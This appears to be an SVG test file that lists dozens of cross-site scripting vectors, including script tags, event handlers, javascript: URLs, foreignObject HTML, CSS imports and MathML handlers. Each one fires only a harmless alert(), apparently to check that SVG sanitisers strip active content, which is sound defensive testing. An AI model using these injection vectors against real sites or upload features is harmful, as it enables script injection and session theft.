<?xml version="1.0" encoding="utf-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" onload="alert('SVG Load')" onmouseover="alert('SVG Hover')">
  <!-- Direct script block -->
  <script>alert('Script Block 1')</script>
  <script xmlns="http://www.w3.org/1999/xhtml">alert('XHTML Script')</script>
  
  <!-- Image with error handler -->
  <image xlink:href="invalid" onerror="alert('Image Error')" width="100" height="100"/>
  <img xmlns="http://www.w3.org/1999/xhtml" src="x" onerror="alert('HTML Image Error')"/>
  
  <!-- JavaScript links -->
  <a xlink:href="javascript:alert('Link JS 1')">
    <text x="10" y="15">Click Link 1</text>
  </a>
  <a xmlns="http://www.w3.org/1999/xhtml" href="javascript:alert('Link JS 2')">
    <text x="10" y="35">Click Link 2</text>
  </a>
  
  <!-- ForeignObject with HTML content -->
  <foreignObject x="10" y="50" width="200" height="200">
    <div xmlns="http://www.w3.org/1999/xhtml">
      <script>alert('ForeignObject Script')</script>
      <img src="x" onerror="alert('ForeignObject Image Error')"/>
      <a href="javascript:alert('ForeignObject Link')">Click HTML Link</a>
      <button onclick="alert('ForeignObject Click')">Click Button</button>
      <iframe src="javascript:alert('ForeignObject Iframe')"></iframe>
      <body onload="alert('ForeignObject Body Load')"/>
      <form action="javascript:alert('ForeignObject Form')">
        <input type="submit" value="Submit Form"/>
      </form>
    </div>
  </foreignObject>
  
  <!-- Animation events -->
  <rect width="100" height="100" fill="red">
    <animate attributeName="x" from="0" to="100" begin="0s" onend="alert('Animation End')"/>
    <animate attributeName="y" from="0" to="100" begin="click" onbegin="alert('Animation Begin')"/>
  </rect>
  
  <!-- Use element with events -->
  <g id="malicious" onclick="alert('Use Click')" onmouseover="alert('Use Hover')">
    <text x="10" y="100">Hover/Click Use</text>
  </g>
  <use xlink:href="#malicious" x="50" y="50"/>
  
  <!-- Set element for event attributes -->
  <set attributeName="onclick" to="alert('Set Click')" begin="0s"/>
  <rect x="150" y="150" width="50" height="50" fill="blue"/>
  
  <!-- CSS import attempts -->
  <style>
    @import url('javascript:alert("CSS Import")');
    @import url('data:text/css,*{background:url("javascript:alert("CSS Background")")}');
  </style>
  
  <!-- Script via xlink:href -->
  <script xlink:href="data:text/javascript,alert('XLink Script')"/>
  
  <!-- Event handlers on all elements -->
  <circle cx="250" cy="50" r="20" fill="green" onclick="alert('Circle Click')" onload="alert('Circle Load')"/>
  <text x="10" y="120" onclick="alert('Text Click')">Clickable Text</text>
  <path d="M10,150 L100,150" stroke="black" onclick="alert('Path Click')"/>
  
  <!-- SVG title with events -->
  <title onload="alert('Title Load')">Malicious Title</title>
  
  <!-- Metadata with script -->
  <metadata>
    <script>alert('Metadata Script')</script>
  </metadata>
  
  <!-- CDATA script sections -->
  <script type="text/javascript">
    <![CDATA[
      alert('CDATA Script');
      function exploit() { alert('Function Call'); }
      exploit();
    ]]>
  </script>
  
  <!-- Nested SVG -->
  <svg x="200" y="200" width="100" height="100" onload="alert('Nested SVG Load')">
    <rect width="100%" height="100%" fill="yellow" onclick="alert('Nested Rect Click')"/>
  </svg>
  
  <!-- Handler attributes -->
  <rect x="300" y="10" width="50" height="30" fill="purple" 
        onfocus="alert('Focus')" 
        onblur="alert('Blur')"
        onkeydown="alert('Keydown')"
        onmousedown="alert('Mouse Down')"
        onmouseup="alert('Mouse Up')"
        onmousemove="alert('Mouse Move')"/>
        
  <!-- Additional vector: object element -->
  <foreignObject x="10" y="250" width="100" height="50">
    <object xmlns="http://www.w3.org/1999/xhtml" data="javascript:alert('Object Data')">
      <param name="onerror" value="alert('Object Param')"/>
    </object>
  </foreignObject>
  
  <!-- Embed element -->
  <foreignObject x="120" y="250" width="100" height="50">
    <embed xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert('Embed Src')"/>
  </foreignObject>
  
  <!-- MathML with events -->
  <foreignObject x="230" y="250" width="100" height="50">
    <math xmlns="http://www.w3.org/1998/Math/MathML" onclick="alert('MathML Click')">
      <mi onclick="alert('MathMI Click')">x</mi>
    </math>
  </foreignObject>

</svg>
